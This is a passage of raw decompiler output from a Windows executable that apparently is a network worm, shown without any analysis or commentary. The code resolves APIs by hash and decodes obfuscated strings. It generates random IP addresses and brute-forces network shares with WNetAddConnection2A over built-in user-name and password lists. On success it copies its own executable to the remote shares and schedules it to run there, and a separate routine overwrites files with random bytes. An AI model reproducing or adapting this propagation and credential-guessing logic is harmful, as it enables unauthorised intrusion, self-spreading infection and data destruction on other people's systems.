  char *local_1a0;
  char *local_19c;
  undefined local_198 [400];
  undefined *local_8;
  
  local_1a0 = (char *)0x0;
  local_19c = (char *)0x0;
  puStack_1b0 = (undefined *)0x40482b;
  local_8 = param_1;
  FUN_00402b14((int)param_1);
  puStack_1b4 = &LAB_00404952;
  uStack_1b8 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1b8;
  puStack_1bc = (undefined *)0x404840;
  puStack_1b0 = &stack0xfffffffc;
  FUN_0040268c(param_2);
  puStack_1bc = local_198;
  uStack_1c0 = 0x101;
  puStack_1c4 = (undefined *)0x404852;
  (*DAT_0040c698)();
  puStack_1c8 = &LAB_0040491c;
  uStack_1cc = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1cc;
  puStack_1c4 = &stack0xfffffffc;
  puVar2 = FUN_00402b24(local_8);
  iVar3 = (*DAT_0040c668)();
  if (iVar3 != 0) {
    iVar3 = *(int *)(iVar3 + 0xc);
    for (iVar6 = 0; *(int *)(iVar3 + iVar6 * 4) != 0; iVar6 = iVar6 + 1) {
      if (local_8 == (undefined *)0x0) {
        puVar4 = (undefined4 *)(*DAT_0040c65c)();
        FUN_00402878((int *)&local_19c,puVar4);
        pcVar5 = FUN_00402c64("169",local_19c);
        if (pcVar5 != (char *)0x1) {
          puVar4 = (undefined4 *)(*DAT_0040c65c)();
          FUN_00402878((int *)&local_1a0,puVar4);
          pcVar5 = FUN_00402c64("192",local_1a0);
          if (pcVar5 != (char *)0x1) {
            puVar4 = (undefined4 *)(*DAT_0040c65c)();
            FUN_00402878(param_2,puVar4);
            break;
          }
        }
      }
      else {
        puVar4 = (undefined4 *)(*DAT_0040c65c)();
        FUN_00402878(param_2,puVar4);
      }
    }
  }
  puVar1 = puStack_1c8;
  *in_FS_OFFSET = puVar2;
  puStack_1c8 = (undefined *)0x40492c;
  (*DAT_0040c64c)(0,puVar2,puVar1);
  *in_FS_OFFSET = puStack_1c4;
  puStack_1bc = &LAB_00404959;
  uStack_1c0 = 0x404949;
  FUN_004026b0((int *)&local_1a0,2);
  uStack_1c0 = 0x404951;
  FUN_0040268c((int *)&local_8);
  return;
}



undefined4 FUN_004049a0(void)

{
  undefined4 uVar1;
  int iStack_8c;
  
  uVar1 = 0;
  (*DAT_0040c608)();
  if (iStack_8c == 2) {
    uVar1 = 0xffffffff;
  }
  return uVar1;
}



void FUN_004049cc(int *param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  char cVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  undefined4 *local_10;
  int local_c;
  undefined4 *local_8;
  
  puStack_1c = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  local_c = 0;
  local_10 = (undefined4 *)0x0;
  puStack_20 = &LAB_00404a5f;
  uStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_24;
  uVar2 = FUN_00403a28(0xb);
  for (cVar4 = (char)uVar2 + '\x05'; cVar4 != '\0'; cVar4 = cVar4 + -1) {
    FUN_00404b48(2,&local_c);
    iVar1 = local_c;
    iVar3 = FUN_00403a28(0x3e);
    FUN_00402868((int *)&local_8,CONCAT31((int3)((uint)iVar1 >> 8),*(undefined *)(iVar1 + iVar3)));
    FUN_00402934(param_1,local_8);
  }
  FUN_00404b48(5,(int *)&local_10);
  FUN_00402934(param_1,local_10);
  *in_FS_OFFSET = uStack_24;
  puStack_1c = &LAB_00404a66;
  puStack_20 = (undefined *)0x404a5e;
  FUN_004026b0((int *)&local_10,3);
  return;
}



void FUN_00404a6c(ushort param_1,int param_2,int *param_3)

{
  uint uVar1;
  short sVar2;
  ushort uVar3;
  ushort uVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  undefined4 *local_18;
  undefined4 *local_14;
  int *local_10;
  int local_c;
  ushort local_6;
  
  puStack_28 = &stack0xfffffffc;
  local_18 = (undefined4 *)0x0;
  local_14 = (undefined4 *)0x0;
  puStack_2c = &LAB_00404b37;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  uVar4 = 0;
  local_10 = param_3;
  local_c = param_2;
  local_6 = param_1;
  FUN_0040268c((int *)&local_14);
  sVar2 = local_6 - 1;
  if (sVar2 != 0) {
    uVar3 = 1;
    do {
      uVar4 = uVar4 + (*(byte *)(local_c + (uint)uVar4) ^ uVar3) + 1;
      uVar3 = uVar3 + 1;
      sVar2 = sVar2 + -1;
    } while (sVar2 != 0);
  }
  uVar3 = *(byte *)(local_c + (uint)uVar4) ^ local_6;
  if (uVar3 != 0) {
    uVar1 = 1;
    do {
      FUN_00402868((int *)&local_18,
                   (uint)*(byte *)(local_c + (uint)uVar4 + (uVar1 & 0xffff)) ^
                   (uVar1 & 0xffff) + (uint)local_6 + 4);
      FUN_00402934((int *)&local_14,local_18);
      uVar1 = uVar1 + 1;
      uVar3 = uVar3 - 1;
    } while (uVar3 != 0);
  }
  FUN_004026e0(local_10,local_14);
  *in_FS_OFFSET = uStack_30;
  puStack_28 = &LAB_00404b3e;
  puStack_2c = (undefined *)0x404b36;
  FUN_004026b0((int *)&local_18,2);
  return;
}



void FUN_00404b48(ushort param_1,int *param_2)

{
  FUN_00404a6c(param_1,0x4090e0,param_2);
  return;
}



void FUN_00404b60(ushort param_1,int *param_2)

{
  FUN_00404a6c(param_1,0x4090d0,param_2);
  return;
}



void FUN_00404b78(ushort param_1,undefined4 param_2,uint param_3,int *param_4)

{
  uint uVar1;
  
  if (-1 < (int)param_3) {
    uVar1 = param_3 >> 2;
    do {
      uVar1 = uVar1 - 1;
    } while (-1 < (int)uVar1);
  }
  FUN_00404a6c(param_1,(int)&stack0xfffffff4,param_4);
  return;
}



int FUN_00404bac(undefined4 param_1,uint param_2)

{
  ushort uVar1;
  uint uVar2;
  int iVar3;
  
  if (-1 < (int)param_2) {
    uVar2 = param_2 >> 2;
    do {
      uVar2 = uVar2 - 1;
    } while (-1 < (int)uVar2);
  }
  iVar3 = 0;
  uVar1 = 0;
  do {
    uVar1 = uVar1 + ((ushort)(byte)(&stack0xfffffff0)[uVar1] ^ (short)iVar3 + 1U) + 1;
    iVar3 = iVar3 + 1;
  } while ((uint)uVar1 != param_2 + 1);
  return iVar3;
}



void FUN_00404bf4(int param_1,undefined *param_2)

{
  undefined *puVar1;
  undefined4 uVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  short sVar6;
  undefined4 *in_FS_OFFSET;
  uint *puVar7;
  undefined4 uStack_374;
  undefined *puStack_370;
  undefined *puStack_36c;
  undefined *local_35c;
  undefined local_355 [513];
  HANDLE local_154 [83];
  undefined *local_8;
  
  local_35c = (undefined *)0x0;
  puStack_36c = (undefined *)0x404c15;
  local_8 = param_2;
  FUN_00402b14((int)param_2);
  puStack_370 = &LAB_00404d2b;
  uStack_374 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_374;
  puStack_36c = &stack0xfffffffc;
  FUN_00402b24(local_8);
  FUN_00401464(0,(int *)&local_35c);
  puVar1 = FUN_00402b24(local_35c);
  (*DAT_0040c610)();
  sVar6 = 0x201;
  puVar5 = local_355;
  do {
    uVar2 = FUN_00403a28(0x100);
    *puVar5 = (char)uVar2;
    puVar5 = puVar5 + 1;
    sVar6 = sVar6 + -1;
  } while (sVar6 != 0);
  FUN_004017bc(local_154,local_8);
  FUN_00401b14(local_154,(HANDLE)0x1);
  iVar3 = FUN_004012f8();
  if (iVar3 == 0) {
    uVar4 = FUN_00401984(local_154);
    if ((int)uVar4 < 0) {
      uVar4 = uVar4 + 0x1ff;
    }
    FUN_00401b30(local_154,((int)uVar4 >> 9) << 9);
    iVar3 = FUN_004012f8();
    if (iVar3 == 0) {
      FUN_00401bd0(local_154);
      puVar7 = (uint *)0x0;
      uVar4 = FUN_00403a28(0x1fd);
      FUN_0040190c(local_154,local_355,uVar4,puVar7);
      FUN_0040192c((undefined *)local_154);
      if (param_1 != 0) {
        FUN_00402b24(local_8);
        (*DAT_0040c614)();
      }
    }
  }
  *in_FS_OFFSET = puVar1;
  FUN_0040268c((int *)&local_35c);
  FUN_0040268c((int *)&local_8);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404d3c(void)

{
  undefined *puVar1;
  LPCSTR pCVar2;
  HMODULE pHVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  undefined *local_20;
  undefined *local_1c;
  undefined *local_18;
  undefined *local_14;
  undefined *local_10;
  undefined *local_c;
  undefined *local_8;
  
  puVar1 = PTR_DAT_0040a6c4;
  puStack_28 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  local_c = (undefined *)0x0;
  local_10 = (undefined *)0x0;
  local_14 = (undefined *)0x0;
  local_18 = (undefined *)0x0;
  local_1c = (undefined *)0x0;
  local_20 = (undefined *)0x0;
  puStack_2c = &LAB_004051da;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  FUN_00404b48(0x39,(int *)&local_8);
  pCVar2 = FUN_00402b24(local_8);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  _DAT_0040c5e8 = FUN_00403744(0x814db6ad);
  _DAT_0040c5ec = FUN_00403744(0xd2e536b7);
  _DAT_0040c5f0 = FUN_00403744(0xab40bf8d);
  _DAT_0040c5f4 = FUN_00403744(0xdf27514b);
  _DAT_0040c5f8 = FUN_00403744(0xb09315f4);
  _DAT_0040c5fc = FUN_00403744(0x267cf1a5);
  _DAT_0040c600 = FUN_00403744(0xc1f3b876);
  _DAT_0040c604 = FUN_00403744(0x28ed5c0);
  DAT_0040c5e4 = FUN_00403744(0xcef2eda8);
  DAT_0040c608 = FUN_00403744(0xdf87764a);
  _DAT_0040c60c = FUN_00403744(0xf6a56750);
  DAT_0040c610 = FUN_00403744(0x199dc99);
  DAT_0040c614 = FUN_00403744(0x156b9702);
  DAT_0040c618 = FUN_00403744(0xfff372be);
  _DAT_0040c61c = FUN_00403744(0xdadd89eb);
  DAT_0040c6b0 = FUN_00403744(0x30601c1c);
  DAT_0040c6b4 = FUN_00403744(0xe058bb45);
  _DAT_0040c6b8 = FUN_00403744(0xa851d916);
  _DAT_0040c6bc = FUN_00403744(0x59d89102);
  _DAT_0040c6c0 = FUN_00403744(0x1cca53fd);
  FUN_00404b48(99,(int *)&local_c);
  pCVar2 = FUN_00402b24(local_c);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  _DAT_0040c620 = FUN_00403744(0x4b9c777b);
  _DAT_0040c624 = FUN_00403744(0xfe876e09);
  _DAT_0040c628 = FUN_00403744(0x8199dd7e);
  _DAT_0040c62c = FUN_00403744(0x81f41244);
  _DAT_0040c630 = FUN_00403744(0xbe527a65);
  _DAT_0040c634 = FUN_00403744(0x7f16d134);
  _DAT_0040c638 = FUN_00403744(0xa1a4264e);
  _DAT_0040c63c = FUN_00403744(0x572d5d8e);
  _DAT_0040c640 = FUN_00403744(0x25760ecd);
  FUN_00404b48(0x3c,(int *)&local_10);
  pCVar2 = FUN_00402b24(local_10);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  _DAT_0040c644 = FUN_00403744(0x6703f194);
  FUN_00404b48(0x3e,(int *)&local_14);
  pCVar2 = FUN_00402b24(local_14);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  DAT_0040c648 = FUN_00403744(0xf2e5fc0c);
  FUN_00404b48(0x41,(int *)&local_18);
  pCVar2 = FUN_00402b24(local_18);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  DAT_0040c690 = FUN_00403744(0xa7733acd);
  DAT_0040c698 = FUN_00403744(0xa0f5fc93);
  DAT_0040c67c = FUN_00403744(0x5e568bb);
  DAT_0040c658 = FUN_00403744(0xfac416e8);
  DAT_0040c650 = FUN_00403744(0x5308a87e);
  DAT_0040c6a0 = FUN_00403744(0x74cff91f);
  DAT_0040c68c = FUN_00403744(0x59d852ad);
  DAT_0040c654 = FUN_00403744(0xa5c6d777);
  DAT_0040c65c = FUN_00403744(0x7007834d);
  DAT_0040c668 = FUN_00403744(0x377545a2);
  DAT_0040c64c = FUN_00403744(0x8e3398bc);
  _DAT_0040c6a8 = FUN_00403744(0x6fdf0506);
  _DAT_0040c680 = FUN_00403744(0xd5378b2e);
  _DAT_0040c6ac = FUN_00403744(0x32753c31);
  DAT_0040c660 = FUN_00403744(0x23de44ce);
  DAT_0040c6a4 = FUN_00403744(0x4bf2eac0);
  DAT_0040c69c = FUN_00403744(0x46ccf353);
  DAT_0040c674 = FUN_00403744(0xc22467fd);
  DAT_0040c694 = FUN_00403744(0xb320ed34);
  _DAT_0040c670 = FUN_00403744(0x89a70c2);
  DAT_0040c664 = FUN_00403744(0x1802e858);
  _DAT_0040c678 = FUN_00403744(0x3b92875e);
  DAT_0040c66c = FUN_00403744(0x2620a494);
  DAT_0040c688 = FUN_00403744(0x3bcca991);
  FUN_00404b48(6,(int *)&local_1c);
  pCVar2 = FUN_00402b24(local_1c);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  _DAT_0040c684 = FUN_00403744(0xcd0cd19e);
  FUN_00404b48(0xb3,(int *)&local_20);
  pCVar2 = FUN_00402b24(local_20);
  pHVar3 = LoadLibraryA(pCVar2);
  *(HMODULE *)puVar1 = pHVar3;
  DAT_0040c6c8 = FUN_00403744(0xc685fb8d);
  DAT_0040c6cc = FUN_00403744(0xdf5115f6);
  iVar4 = FUN_004049a0();
  if (iVar4 == 0) {
    DAT_0040c6d0 = FUN_00403744(0x8146b671);
  }
  else {
    DAT_0040c6d4 = FUN_00403744(0x8146b671);
    DAT_0040c6c4 = FUN_00403744(0xc61ff01d);
  }
  *in_FS_OFFSET = uStack_30;
  puStack_28 = &LAB_004051e1;
  puStack_2c = (undefined *)0x4051d9;
  FUN_004026b0((int *)&local_20,7);
  return;
}



void FUN_004054ac(int *param_1,char param_2,byte *param_3)

{
  undefined2 uVar1;
  int iVar2;
  byte *extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY_44;
  undefined *puStackY_40;
  undefined *puStackY_3c;
  undefined4 in_stack_ffffffc8;
  undefined4 in_stack_ffffffcc;
  undefined4 in_stack_ffffffd0;
  undefined4 in_stack_ffffffd4;
  byte *local_c;
  char local_5;
  
  if (param_2 != '\0') {
    puStackY_3c = (undefined *)0x4054c1;
    param_1 = (int *)FUN_00401f88((int)param_1,param_2,param_3,in_stack_ffffffc8,in_stack_ffffffcc,
                                  in_stack_ffffffd0,in_stack_ffffffd4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  puStackY_3c = (undefined *)0x4054d1;
  local_c = param_3;
  local_5 = param_2;
  FUN_00402b14((int)param_3);
  puStackY_40 = &LAB_004055b5;
  uStackY_44 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY_44;
  puStackY_3c = &stack0xfffffffc;
  FUN_00401e68(param_1,'\0',extraout_ECX_00);
  param_1[1] = -1;
  FUN_0040268c(param_1 + 4);
  FUN_0040268c(param_1 + 3);
  (**(code **)PTR_DAT_0040a6c0)();
  iVar2 = (**(code **)PTR_DAT_0040a67c)();
  param_1[1] = iVar2;
  if (iVar2 != -1) {
    FUN_00402b24(local_c);
    iVar2 = (**(code **)PTR_DAT_0040a684)();
    if (iVar2 == 0) {
      FUN_00403e88(local_c);
      (**(code **)PTR_DAT_0040a69c)();
      uVar1 = FUN_00403e88(local_c);
      *(undefined2 *)(param_1 + 2) = uVar1;
    }
    else {
      uVar1 = (**(code **)PTR_DAT_0040a698)();
      *(undefined2 *)(param_1 + 2) = uVar1;
    }
    (**(code **)PTR_DAT_0040a694)();
  }
  *in_FS_OFFSET = 2;
  FUN_0040268c((int *)&local_c);
  return;
}



undefined4 FUN_00405614(void)

{
  int iVar1;
  
  iVar1 = (**(code **)PTR_DAT_0040a6b4)();
  if (iVar1 != 0) {
    return 0;
  }
  return 0xffffffff;
}



undefined4 FUN_00405634(void)

{
  (**(code **)PTR_DAT_0040a6f8)();
  return 0xffffffff;
}



void FUN_00405668(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_40;
  undefined *puStack_3c;
  undefined *puStack_38;
  int local_28;
  int local_24;
  int local_20;
  int local_1c [2];
  byte local_14;
  byte local_13;
  byte local_12;
  byte local_11;
  undefined4 local_8;
  
  puStack_38 = &stack0xfffffffc;
  local_1c[0] = 0;
  local_20 = 0;
  local_24 = 0;
  local_28 = 0;
  puStack_3c = &LAB_00405771;
  uStack_40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_40;
  local_8 = 0x10;
  uVar1 = *(undefined4 *)(param_1 + 4);
  iVar2 = (**(code **)PTR_DAT_0040a678)();
  *(int *)(param_2 + 0x10) = iVar2;
  if (iVar2 != -1) {
    FUN_00403e60((uint)local_14,local_1c);
    FUN_00403e60((uint)local_13,&local_20);
    FUN_00403e60((uint)local_12,&local_24);
    FUN_00403e60((uint)local_11,&local_28);
    FUN_004029ec((int *)(param_1 + 0xc),7);
    FUN_004026e0((int *)(param_2 + 8),*(undefined4 **)(param_1 + 0xc));
    FUN_004026e0((int *)(param_2 + 0xc),*(undefined4 **)(param_1 + 0x10));
    puVar3 = (undefined4 *)(**(code **)PTR_DAT_0040a6d0)();
    if (puVar3 == (undefined4 *)0x0) {
      FUN_0040268c((int *)(param_1 + 0x10));
    }
    else {
      FUN_00402878((int *)(param_1 + 0x10),(undefined4 *)*puVar3);
    }
  }
  *in_FS_OFFSET = uVar1;
  FUN_004026b0(&local_28,4);
  return;
}



int * FUN_004057bc(int *param_1,char param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00401f88((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00401e68(param_1,'\0',param_3);
  param_1[4] = -1;
  FUN_0040268c(param_1 + 3);
  FUN_0040268c(param_1 + 2);
  if (param_2 != '\0') {
    FUN_00401fe0(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



undefined4 FUN_00405890(int param_1)

{
  int iVar1;
  undefined4 unaff_ESI;
  
  iVar1 = (**(code **)PTR_DAT_0040a6ec)();
  if (iVar1 == -1) {
    unaff_ESI = 0;
  }
  *(undefined4 *)(param_1 + 0x10) = 0xffffffff;
  FUN_0040268c((int *)(param_1 + 0xc));
  return unaff_ESI;
}



void FUN_00405998(int param_1)

{
  undefined *puVar1;
  int iVar2;
  undefined4 *puVar3;
  char *pcVar4;
  int iVar5;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c8;
  undefined *puStack_1c4;
  undefined *puStack_1c0;
  undefined4 uStack_1bc;
  undefined *puStack_1b8;
  undefined4 uStack_1b4;
  undefined *puStack_1b0;
  undefined *puStack_1ac;
  char *local_19c;
  char *local_198;
  undefined local_194 [400];
  
  puStack_1ac = &stack0xfffffffc;
  local_19c = (char *)0x0;
  local_198 = (char *)0x0;
  puStack_1b0 = &LAB_00405aca;
  uStack_1b4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1b4;
  puStack_1b8 = local_194;
  uStack_1bc = 0x101;
  puStack_1c0 = (undefined *)0x4059d7;
  (**(code **)PTR_DAT_0040a6dc)();
  puStack_1c4 = &DAT_00405a98;
  uStack_1c8 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c8;
  puStack_1c0 = &stack0xfffffffc;
  iVar2 = (**(code **)PTR_DAT_0040a6a8)();
  if (iVar2 != 0) {
    iVar2 = *(int *)(iVar2 + 0xc);
    for (iVar5 = 0; *(int *)(iVar2 + iVar5 * 4) != 0; iVar5 = iVar5 + 1) {
      puVar3 = (undefined4 *)(**(code **)PTR_DAT_0040a68c)();
      FUN_00402878((int *)&local_198,puVar3);
      pcVar4 = FUN_00402c64("169",local_198);
      if (pcVar4 != (char *)0x1) {
        puVar3 = (undefined4 *)(**(code **)PTR_DAT_0040a68c)();
        FUN_00402878((int *)&local_19c,puVar3);
        pcVar4 = FUN_00402c64("192",local_19c);
        if (pcVar4 != (char *)0x1) {
          *(undefined *)(param_1 + 4) = **(undefined **)(iVar2 + iVar5 * 4);
          *(undefined *)(param_1 + 5) = *(undefined *)(*(int *)(iVar2 + iVar5 * 4) + 1);
          *(undefined *)(param_1 + 6) = *(undefined *)(*(int *)(iVar2 + iVar5 * 4) + 2);
          *(undefined *)(param_1 + 7) = *(undefined *)(*(int *)(iVar2 + iVar5 * 4) + 3);
          break;
        }
      }
    }
  }
  puVar1 = puStack_1c4;
  *in_FS_OFFSET = 0;
  puStack_1c4 = (undefined *)0x405aac;
  (**(code **)PTR_DAT_0040a6b0)(0,0,puVar1);
  *in_FS_OFFSET = puStack_1c0;
  puStack_1b8 = &LAB_00405ad1;
  uStack_1bc = 0x405ac9;
  FUN_004026b0((int *)&local_19c,2);
  return;
}



void FUN_00405af0(undefined4 param_1,uint param_2,int *param_3)

{
  byte abStack_108 [256];
  
  FUN_00401bc4(param_2,(char *)abStack_108);
  FUN_004028e4(param_3,abStack_108);
  return;
}



int FUN_00405b18(undefined4 param_1,undefined *param_2)

{
  byte bVar1;
  uint uVar2;
  
  FUN_00402b24(param_2);
  uVar2 = (**(code **)PTR_DAT_0040a6cc)();
  if ((uVar2 == 0xffffffff) || ((uVar2 & 0x10) != 0x10)) {
    bVar1 = 0;
  }
  else {
    bVar1 = 1;
  }
  return -(uint)bVar1;
}



void FUN_00405b48(int param_1,undefined *param_2)

{
  LPWSTR pWVar1;
  LPWSTR pWVar2;
  undefined *puVar3;
  int iVar4;
  int iVar5;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_38;
  undefined *puStack_34;
  undefined *puStack_30;
  int local_20 [3];
  LPWSTR local_14;
  int local_10;
  undefined *local_8;
  
  puStack_30 = (undefined *)0x405b5e;
  local_8 = param_2;
  FUN_00402b14((int)param_2);
  puStack_34 = &LAB_00405c69;
  puStack_38 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_38;
  puStack_30 = &stack0xfffffffc;
  pWVar1 = (LPWSTR)FUN_004011d8(0x401);
  pWVar2 = (LPWSTR)FUN_004011d8(0x101);
  local_10 = 0;
  FUN_00403174(*(undefined **)(param_1 + 0x14),pWVar2,0x100);
  FUN_00403174(local_8,pWVar1,0x400);
  puVar3 = FUN_00402b24(*(undefined **)(param_1 + 0x14));
  iVar4 = (**(code **)PTR_DAT_0040a6b8)();
  if (iVar4 == 0) {
    iVar4 = (*(int *)(local_10 + 8) * 0xe10 + *(int *)(local_10 + 0xc) * 0x3c +
            *(int *)(local_10 + 0x10)) * 1000 + *(int *)(local_10 + 0x14) * 10;
    if (*(int *)(local_10 + 0x18) != -1) {
      iVar4 = iVar4 + *(int *)(local_10 + 0x18) * -60000;
    }
    iVar5 = FUN_004049a0();
    if (iVar5 != 0) {
      (**(code **)PTR_DAT_0040a6a4)();
    }
    FUN_00403bdc(local_20,0x10);
    local_20[0] = iVar4 + 60000;
    local_14 = pWVar1;
    (**(code **)PTR_DAT_0040a670)();
  }
  FUN_004011f0((int)pWVar1);
  FUN_004011f0((int)pWVar2);
  *in_FS_OFFSET = puVar3;
  puStack_38 = &LAB_00405c70;
  FUN_0040268c((int *)&local_8);
  return;
}



void FUN_00405c78(int param_1,undefined *param_2)

{
  short sVar1;
  undefined4 *lpName;
  DWORD DVar2;
  LPSTR lpFilename;
  HMODULE hModule;
  uint uVar3;
  LPCSTR lpUserName;
  LPCSTR lpPassword;
  int iVar4;
  BOOL BVar5;
  int iVar6;
  int iVar7;
  undefined *unaff_ESI;
  LPSTR *in_FS_OFFSET;
  LPSTR local_6c;
  LPCSTR local_68;
  undefined *local_64;
  undefined *local_60;
  DWORD local_5c;
  int local_58;
  undefined *local_54;
  undefined4 *local_50;
  undefined *local_4c;
  LPCSTR in_stack_ffffffb8;
  LPCSTR in_stack_ffffffbc;
  undefined **ppuVar8;
  LPSTR local_30;
  LPSTR local_24;
  undefined *local_20;
  undefined *local_1c;
  ushort uVar9;
  uint uVar10;
  undefined *local_8;
  
  iVar6 = 0xd;
  do {
    iVar6 = iVar6 + -1;
  } while (iVar6 != 0);
  local_1c = (undefined *)0x405c97;
  local_8 = param_2;
  FUN_00402b14((int)param_2);
  local_20 = &LAB_00405ef1;
  local_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = (LPSTR)&local_24;
  local_1c = &stack0xfffffffc;
  FUN_004029ec((int *)&local_8,3);
  local_30 = (LPSTR)0x0;
  lpName = (undefined4 *)FUN_00402b24(local_8);
  local_24 = (LPSTR)0x0;
  DVar2 = FUN_0040292c((int)unaff_ESI);
  lpFilename = FUN_00402b24(unaff_ESI);
  hModule = GetModuleHandleA((LPCSTR)0x0);
  GetModuleFileNameA(hModule,lpFilename,DVar2);
  iVar6 = FUN_004049a0();
  if (iVar6 == 0) {
    uVar3 = 0;
    uVar10 = 0;
  }
  else {
    uVar3 = FUN_00404bac(&DAT_0040a3bc,0x20);
    iVar6 = FUN_00404bac(&DAT_0040a3e0,0x279);
    uVar10 = iVar6 << 0x10;
  }
  local_20 = (undefined *)((uVar3 & 0xffff) + 1);
  uVar9 = 0;
  do {
    iVar6 = (uVar10 >> 0x10) + 1;
    local_1c = (undefined *)0x0;
    do {
      DVar2 = 0;
      FUN_00404b78(uVar9,&DAT_0040a3bc,0x20,(int *)&stack0xffffffbc);
      lpUserName = FUN_00402b24(in_stack_ffffffbc);
      FUN_00404b78((ushort)local_1c,&DAT_0040a3e0,0x279,(int *)&stack0xffffffb8);
      lpPassword = FUN_00402b24(in_stack_ffffffb8);
      in_stack_ffffffbc = (LPCSTR)0x405da9;
      DVar2 = WNetAddConnection2A((LPNETRESOURCEA)&stack0xffffffc0,lpPassword,lpUserName,DVar2);
      if (DVar2 == 0) {
        iVar7 = 1;
        do {
          FUN_00402878((int *)&local_4c,lpName);
          ppuVar8 = &local_4c;
          sVar1 = (short)iVar7;
          FUN_00404b48(sVar1 + 0xb9,(int *)&local_50);
          FUN_00402934((int *)ppuVar8,local_50);
          iVar4 = FUN_00405b18(param_1,local_4c);
          if (iVar4 != 0) {
            FUN_00404b48(sVar1 + 0xb9,&local_58);
            FUN_00404b48(0xbe,(int *)&local_5c);
            DVar2 = local_5c;
            FUN_004029ec((int *)&local_54,3);
            in_stack_ffffffbc = FUN_00402b24(local_54);
            FUN_00401464(0,(int *)&local_60);
            in_stack_ffffffb8 = FUN_00402b24(local_60);
            local_4c = (undefined *)0x405e41;
            BVar5 = CopyFileA(in_stack_ffffffb8,in_stack_ffffffbc,DVar2);
            if ((BVar5 != 0) && (iVar4 = FUN_004049a0(), iVar4 != 0)) {
              FUN_00404b48(sVar1 + 0xb9,(int *)&local_68);
              in_stack_ffffffb8 = (LPCSTR)0x405e6e;
              in_stack_ffffffbc = local_68;
              FUN_00404b48(0xbe,(int *)&local_6c);
              local_30 = local_6c;
              local_4c = (undefined *)0x405e7e;
              FUN_004029ec((int *)&local_64,3);
              local_4c = (undefined *)0x405e88;
              FUN_00405b48(param_1,local_64);
            }
          }
          iVar7 = iVar7 + 1;
        } while (iVar7 != 5);
        iVar7 = 0x15;
        do {
          DVar2 = WNetCancelConnectionA((LPCSTR)lpName,-1);
          if (DVar2 == 0) break;
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
      }
      local_1c = (undefined *)((int)local_1c + 1);
      iVar6 = iVar6 + -1;
    } while (iVar6 != 0);
    uVar9 = uVar9 + 1;
    local_20 = (undefined *)((int)local_20 + -1);
    if (local_20 == (undefined *)0x0) {
      *in_FS_OFFSET = local_30;
      FUN_004026b0((int *)&local_6c,0xb);
      FUN_0040268c((int *)&stack0xffffffec);
      FUN_0040268c((int *)&local_8);
      return;
    }
  } while( true );
}



void FUN_00406040(int param_1)

{
  char *pcVar1;
  undefined *puVar2;
  undefined4 uVar3;
  int iVar4;
  int *in_FS_OFFSET;
  undefined uVar5;
  int iStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  puStack_1c = &stack0xfffffffc;
  local_8 = 0;
  local_c = 0;
  local_10 = 0;
  local_14 = 0;
  puStack_20 = &LAB_004061bf;
  iStack_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack_24;
  uVar5 = *(int *)(param_1 + 0x10) == 0;
  puVar2 = &stack0xfffffffc;
  if ((bool)uVar5) {
    uVar3 = FUN_00403a28(0xdf);
    *(char *)(param_1 + 4) = (char)uVar3 + '\x01';
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 5) = (char)uVar3 + '\x01';
    uVar3 = FUN_00403a28(0xff);
    *(char *)(param_1 + 6) = (char)uVar3 + '\x01';
    iVar4 = FUN_00403a28(0xff);
    uVar5 = iVar4 + 1 == 0;
    *(char *)(param_1 + 7) = (char)(iVar4 + 1);
    puVar2 = puStack_1c;
  }
